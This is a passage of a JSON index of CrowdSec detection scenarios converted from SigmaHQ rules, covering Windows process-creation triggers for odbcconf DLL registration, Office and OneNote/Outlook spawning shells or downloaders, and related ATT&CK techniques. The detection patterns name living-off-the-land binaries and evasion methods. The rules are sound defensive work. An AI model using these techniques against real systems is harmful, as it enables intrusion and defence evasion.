evt.Parsed.CommandLine contains 'INSTALLDRIVER ' && not (evt.Parsed.CommandLine contains '.dll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.008\n\n  label: \"Suspicious Driver/DLL Installation Via Odbcconf.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension. This is often used as a defense evasion method.\n", "path": "scenarios/sigmahq/proc_creation_win_odbcconf_driver_install_susp.yml", "version": "0.2", "versions": {"0.1": {"digest": "1b7adbfcd3fb7b64754f39187bac921eafbe09d81bbb2eab074a43022cfffef5"}, "0.2": {"digest": "03501c4adad8fce51be626563700262c9f9ae8cebe44e40f110ef477e0a3d08e"}}}, "sigmahq/proc_creation_win_odbcconf_exec_susp_locations": {"content": "type: trigger\nname: sigmahq/proc_creation_win_odbcconf_exec_susp_locations\ndescription: |\n  Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\odbcconf.exe' || evt.Parsed.OriginalFileName == 'odbcconf.exe') && (evt.Parsed.CommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains ':\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Registration\\\\CRMLog' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\com\\\\dmp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\FxsTmp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\SysWOW64\\\\com\\\\dmp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tracing\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.008\n\n  label: \"Odbcconf.EXE Suspicious DLL Location\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.\n", "path": "scenarios/sigmahq/proc_creation_win_odbcconf_exec_susp_locations.yml", "version": "0.2", "versions": {"0.1": {"digest": "dbb93b6999634da02af9b697a7480e90f44c1baf9ac09c8dfe31d76027e6a4f5"}, "0.2": {"digest": "a642526cfa2cd6a62621b7d1ec14e1b0f13dcb5230212968f5a319f0ac92fe6d"}}}, "sigmahq/proc_creation_win_odbcconf_register_dll_regsvr_susp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_odbcconf_register_dll_regsvr_susp\ndescription: |\n  Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\odbcconf.exe' || evt.Parsed.OriginalFileName == 'odbcconf.exe') && evt.Parsed.CommandLine contains 'REGSVR ' && not (evt.Parsed.CommandLine contains '.dll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.008\n\n  label: \"Potentially Suspicious DLL Registered Via Odbcconf.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.\n", "path": "scenarios/sigmahq/proc_creation_win_odbcconf_register_dll_regsvr_susp.yml", "version": "0.2", "versions": {"0.1": {"digest": "b4f15dfbe20d1b96fe908348acc3b8bf83f507662f60c98e25228a0944748486"}, "0.2": {"digest": "eb62f889ee7498ed088a4be798472796184d8f86e1f0c2ca0f2fb85fa78ad866"}}}, "sigmahq/proc_creation_win_office_arbitrary_cli_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_arbitrary_cli_download\ndescription: |\n  Detects potential arbitrary file download using a Microsoft Office application\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\EXCEL.EXE' || evt.Parsed.Image endsWith '\\\\POWERPNT.EXE' || evt.Parsed.Image endsWith '\\\\WINWORD.exe' || evt.Parsed.OriginalFileName in ['Excel.exe', 'POWERPNT.EXE', 'WinWord.exe']) && (evt.Parsed.CommandLine contains 'http://' || evt.Parsed.CommandLine contains 'https://'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Potential Arbitrary File Download Using Office Application\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential arbitrary file download using a Microsoft Office application\n", "path": "scenarios/sigmahq/proc_creation_win_office_arbitrary_cli_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "c6ad21190c87348f4ce949cdbfb906c88945adcd78e0e781b99bd026569e1273"}, "0.2": {"digest": "9e479b5fed7e175ee9ea3ae6cb6ddbaf7db512e7dcc00416309eea46e23c7ba6"}}}, "sigmahq/proc_creation_win_office_excel_dcom_lateral_movement": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_excel_dcom_lateral_movement\ndescription: |\n  Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\excel.exe' && (evt.Parsed.OriginalFileName in ['foxprow.exe', 'schdplus.exe', 'winproj.exe'] || evt.Parsed.Image endsWith '\\\\foxprow.exe' || evt.Parsed.Image endsWith '\\\\schdplus.exe' || evt.Parsed.Image endsWith '\\\\winproj.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.003\n\n  label: \"Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object. \n", "path": "scenarios/sigmahq/proc_creation_win_office_excel_dcom_lateral_movement.yml", "version": "0.2", "versions": {"0.1": {"digest": "d82f6b21f9dd639a0cb697d8cea594008c4dfed5d07de85563ad9018adaf3585"}, "0.2": {"digest": "0f579239333f4016c52a7d0baf492e2c7a0943ecaa485663baa3fa3525433755"}}}, "sigmahq/proc_creation_win_office_exec_from_trusted_locations": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_exec_from_trusted_locations\ndescription: |\n  Detects the execution of an Office application that points to a document that is located in a trusted location. Attackers often used this to avoid macro security and execute their malicious code.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\explorer.exe' || evt.Parsed.ParentImage endsWith '\\\\dopus.exe') && (evt.Parsed.Image endsWith '\\\\EXCEL.EXE' || evt.Parsed.Image endsWith '\\\\POWERPNT.EXE' || evt.Parsed.Image endsWith '\\\\WINWORD.exe' || evt.Parsed.OriginalFileName in ['Excel.exe', 'POWERPNT.EXE', 'WinWord.exe']) && (evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Word\\\\Startup\\\\' || evt.Parsed.CommandLine contains '\\\\Microsoft Office\\\\root\\\\Templates\\\\' || evt.Parsed.CommandLine contains '\\\\Microsoft Office\\\\Templates\\\\') && not (evt.Parsed.CommandLine endsWith '.dotx' || evt.Parsed.CommandLine endsWith '.xltx' || evt.Parsed.CommandLine endsWith '.potx'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Potentially Suspicious Office Document Executed From Trusted Location\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of an Office application that points to a document that is located in a trusted location. Attackers often used this to avoid macro security and execute their malicious code.\n", "path": "scenarios/sigmahq/proc_creation_win_office_exec_from_trusted_locations.yml", "version": "0.2", "versions": {"0.1": {"digest": "fb4587a464e1d207b19f62e544e7fd1e17a83cf11434f506dac5548cca694081"}, "0.2": {"digest": "0b7520cc1a92f85923aeea66401101020d4c42d721a90b7a2e38f6fe6d59f5d9"}}}, "sigmahq/proc_creation_win_office_onenote_embedded_script_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_onenote_embedded_script_execution\ndescription: |\n  Detects the execution of malicious OneNote documents that contain embedded scripts. When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\onenote.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe') && (evt.Parsed.CommandLine contains '\\\\exported\\\\' || evt.Parsed.CommandLine contains '\\\\onenoteofflinecache_files\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.001\n\n  label: \"OneNote.EXE Execution of Malicious Embedded Scripts\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of malicious OneNote documents that contain embedded scripts. When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories. \n", "path": "scenarios/sigmahq/proc_creation_win_office_onenote_embedded_script_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "abce352a56dbc6b9386abfa1e7f2f62f622e85aa133dbf0fbc3be9780e9f922b"}, "0.2": {"digest": "49ccc1d0b1ee18eb612d4cdf4664e8dbb7fa1a9de0eb0d0799841835d95e9104"}}}, "sigmahq/proc_creation_win_office_onenote_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_onenote_susp_child_processes\ndescription: |\n  Detects suspicious child processes of the Microsoft OneNote application. This may indicate an attempt to execute malicious embedded objects from a .one file.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\onenote.exe' && (evt.Parsed.OriginalFileName in ['bitsadmin.exe', 'CertOC.exe', 'CertUtil.exe', 'Cmd.Exe', 'CMSTP.EXE', 'cscript.exe', 'curl.exe', 'HH.exe', 'IEExec.exe', 'InstallUtil.exe', 'javaw.exe', 'Microsoft.Workflow.Compiler.exe', 'msdt.exe', 'MSHTA.EXE', 'msiexec.exe', 'Msxsl.exe', 'odbcconf.exe', 'pcalua.exe', 'PowerShell.EXE', 'RegAsm.exe', 'RegSvcs.exe', 'REGSVR32.exe', 'RUNDLL32.exe', 'schtasks.exe', 'ScriptRunner.exe', 'wmic.exe', 'WorkFolders.exe', 'wscript.exe'] || evt.Parsed.Image endsWith '\\\\AppVLP.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\certoc.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cmstp.exe' || evt.Parsed.Image endsWith '\\\\control.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\hh.exe' || evt.Parsed.Image endsWith '\\\\ieexec.exe' || evt.Parsed.Image endsWith '\\\\installutil.exe' || evt.Parsed.Image endsWith '\\\\javaw.exe' || evt.Parsed.Image endsWith '\\\\mftrace.exe' || evt.Parsed.Image endsWith '\\\\Microsoft.Workflow.Compiler.exe' || evt.Parsed.Image endsWith '\\\\msbuild.exe' || evt.Parsed.Image endsWith '\\\\msdt.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\msidb.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\msxsl.exe' || evt.Parsed.Image endsWith '\\\\odbcconf.exe' || evt.Parsed.Image endsWith '\\\\pcalua.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regasm.exe' || evt.Parsed.Image endsWith '\\\\regsvcs.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\scrcons.exe' || evt.Parsed.Image endsWith '\\\\scriptrunner.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\svchost.exe' || evt.Parsed.Image endsWith '\\\\verclsid.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\workfolders.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\explorer.exe' && (evt.Parsed.CommandLine contains '.hta' || evt.Parsed.CommandLine contains '.vb' || evt.Parsed.CommandLine contains '.wsh' || evt.Parsed.CommandLine contains '.js' || evt.Parsed.CommandLine contains '.ps' || evt.Parsed.CommandLine contains '.scr' || evt.Parsed.CommandLine contains '.pif' || evt.Parsed.CommandLine contains '.bat' || evt.Parsed.CommandLine contains '.cmd') || evt.Parsed.Image contains '\\\\AppData\\\\' || evt.Parsed.Image contains '\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains '\\\\ProgramData\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Tasks\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Temp\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\System32\\\\Tasks\\\\') && not (evt.Parsed.Image endsWith '\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe' && evt.Parsed.CommandLine endsWith '-Embedding' || evt.Parsed.Image contains '\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\' && evt.Parsed.Image endsWith '\\\\FileCoAuth.exe' && evt.Parsed.CommandLine endsWith '-Embedding'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1566\n   - attack.t1566.001\n\n  label: \"Suspicious Microsoft OneNote Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of the Microsoft OneNote application. This may indicate an attempt to execute malicious embedded objects from a .one file.\n", "path": "scenarios/sigmahq/proc_creation_win_office_onenote_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "8d08ce1ee27422897ab5e3c6c7836cabf7143221025852c48020e8b7b2bf2fee"}, "0.2": {"digest": "77abf9b5fc419c6b35a1ad09165f671ed8f517e9b80f272747327992230a7428"}}}, "sigmahq/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules\ndescription: |\n  Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\Outlook\\\\Security\\\\EnableUnsafeClientMailRules')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n   - attack.t1202\n\n  label: \"Outlook EnableUnsafeClientMailRules Setting Enabled\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros\n", "path": "scenarios/sigmahq/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules.yml", "version": "0.2", "versions": {"0.1": {"digest": "22ebdaa3a370e9ed83f819f3dc75c8fb40833fac34df941e70c3fb995559863d"}, "0.2": {"digest": "c1842a3aeed0f51949a0e57e883c67365583ddee547c68fb883b620ca6a8a9c2"}}}, "sigmahq/proc_creation_win_office_outlook_execution_from_temp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_outlook_execution_from_temp\ndescription: |\n  Detects a suspicious program execution in Outlook temp folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains '\\\\Temporary Internet Files\\\\Content.Outlook\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1566.001\n\n  label: \"Suspicious Execution From Outlook Temporary Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious program execution in Outlook temp folder\n", "path": "scenarios/sigmahq/proc_creation_win_office_outlook_execution_from_temp.yml", "version": "0.2", "versions": {"0.1": {"digest": "2926d327b266f00e538cfdd13d0dd5a99047432f72eb2fc1a63659cc6691f39e"}, "0.2": {"digest": "0f6aa8e3d566acca87f5ff541fb56a3acb29d8ae37a87ca474c6b4b8578dc505"}}}, "sigmahq/proc_creation_win_office_outlook_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_outlook_susp_child_processes\ndescription: |\n  Detects a suspicious process spawning from an Outlook process.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\OUTLOOK.EXE' && (evt.Parsed.Image endsWith '\\\\AppVLP.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\hh.exe' || evt.Parsed.Image endsWith '\\\\mftrace.exe' || evt.Parsed.Image endsWith '\\\\msbuild.exe' || evt.Parsed.Image endsWith '\\\\msdt.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\scrcons.exe' || evt.Parsed.Image endsWith '\\\\scriptrunner.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\svchost.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1204.002\n\n  label: \"Suspicious Outlook Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process spawning from an Outlook process.\n", "path": "scenarios/sigmahq/proc_creation_win_office_outlook_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "070a0087ed50556ad3ade377a5fa600e07995b73c853da820aaaf21603bc1cd6"}, "0.2": {"digest": "96d03f9a81848ce8ee0db743ec5f516c27b8b84800cdd0ddee4ed2b1e5dcf7ad"}}}, "sigmahq/proc_creation_win_office_outlook_susp_child_processes_remote": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_outlook_susp_child_processes_remote\ndescription: |\n  Detects a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\outlook.exe' && evt.Parsed.Image startsWith '\\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n   - attack.t1202\n\n  label: \"Suspicious Remote Child Process From Outlook\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares).\n", "path": "scenarios/sigmahq/proc_creation_win_office_outlook_susp_child_processes_remote.yml", "version": "0.2", "versions": {"0.1": {"digest": "a817e2aac1b836e0d539dc73b8a22de74ffac434ec2cc4951f43071e960e44b0"}, "0.2": {"digest": "85877a11362a11b6b460b45d3fb1887a5fa9622451e762bd9a55116fd4de5c59"}}}, "sigmahq/proc_creation_win_office_spawn_exe_from_users_directory": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_spawn_exe_from_users_directory\ndescription: |\n  Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\WINWORD.EXE' || evt.Parsed.ParentImage endsWith '\\\\EXCEL.EXE' || evt.Parsed.ParentImage endsWith '\\\\POWERPNT.exe' || evt.Parsed.ParentImage endsWith '\\\\MSPUB.exe' || evt.Parsed.ParentImage endsWith '\\\\VISIO.exe' || evt.Parsed.ParentImage endsWith '\\\\MSACCESS.exe' || evt.Parsed.ParentImage endsWith '\\\\EQNEDT32.exe') && evt.Parsed.Image startsWith 'C:\\\\users\\\\' && evt.Parsed.Image endsWith '.exe' && not (evt.Parsed.Image endsWith '\\\\Teams.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1204.002\n\n  label: \"Suspicious Binary In User Directory Spawned From Office Application\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)\n", "path": "scenarios/sigmahq/proc_creation_win_office_spawn_exe_from_users_directory.yml", "version": "0.2", "versions": {"0.1": {"digest": "9da47c8bb3980b7c50d4f47151b4c342a61ae8729aa9accb174c7484da136ae6"}, "0.2": {"digest": "4a05abfd062b01b8f1022af0e46b474e303cb2bd4ba9574928f0423408f18735"}}}, "sigmahq/proc_creation_win_office_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_office_susp_child_processes\ndescription: |\n  Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\EQNEDT32.EXE' || evt.Parsed.ParentImage endsWith '\\\\EXCEL.EXE' || evt.Parsed.ParentImage endsWith '\\\\MSACCESS.EXE' || evt.Parsed.ParentImage endsWith '\\\\MSPUB.exe' || evt.Parsed.ParentImage endsWith '\\\\ONENOTE.EXE' || evt.Parsed.ParentImage endsWith '\\\\POWERPNT.exe' || evt.Parsed.ParentImage endsWith '\\\\VISIO.exe' || evt.Parsed.ParentImage endsWith '\\\\WINWORD.EXE' || evt.Parsed.ParentImage endsWith '\\\\wordpad.exe' || evt.Parsed.ParentImage endsWith '\\\\wordview.exe') && (evt.Parsed.OriginalFileName in ['bitsadmin.exe', 'CertOC.exe', 'CertUtil.exe', 'Cmd.Exe', 'CMSTP.EXE', 'cscript.exe', 'curl.exe', 'HH.exe', 'IEExec.exe', 'InstallUtil.exe', 'javaw.exe', 'Microsoft.Workflow.Compiler.exe', 'msdt.exe', 'MSHTA.EXE', 'msiexec.exe', 'Msxsl.exe', 'odbcconf.exe', 'pcalua.exe', 'PowerShell.EXE', 'RegAsm.exe', 'RegSvcs.exe', 'REGSVR32.exe', 'RUNDLL32.exe', 'schtasks.exe', 'ScriptRunner.exe', 'wmic.exe', 'WorkFolders.exe', 'wscript.exe'] || evt.Parsed.Image endsWith '\\\\AppVLP.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\certoc.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cmstp.exe' || evt.Parsed.Image endsWith '\\\\control.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\hh.exe' || evt.Parsed.Image endsWith '\\\\ieexec.exe' || evt.Parsed.Image endsWith '\\\\installutil.exe' || evt.Parsed.Image endsWith '\\\\javaw.exe' || evt.Parsed.Image endsWith '\\\\mftrace.exe' || evt.Parsed.Image endsWith '\\\\Microsoft.Workflow.Compiler.exe' || evt.Parsed.Image endsWith '\\\\msbuild.exe' || evt.Parsed.Image endsWith '\\\\msdt.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\msidb.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\msxsl.exe' || evt.Parsed.Image endsWith '\\\\odbcconf.exe' || evt.Parsed.Image endsWith '\\\\pcalua.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regasm.exe' || evt.Parsed.Image endsWith '\\\\regsvcs.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\scrcons.exe' || evt.Parsed.Image endsWith '\\\\scriptrunner.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\svchost.exe' || evt.Parsed.Image endsWith '\\\\verclsid.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\workfolders.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image contains '\\\\AppData\\\\' || evt.Parsed.Image contains '\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains '\\\\ProgramData\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Tasks\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Temp\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\System32\\\\Tasks\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1204.002\n   - attack.t1218.010\n\n  label: \"Suspicious Microsoft Office Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: 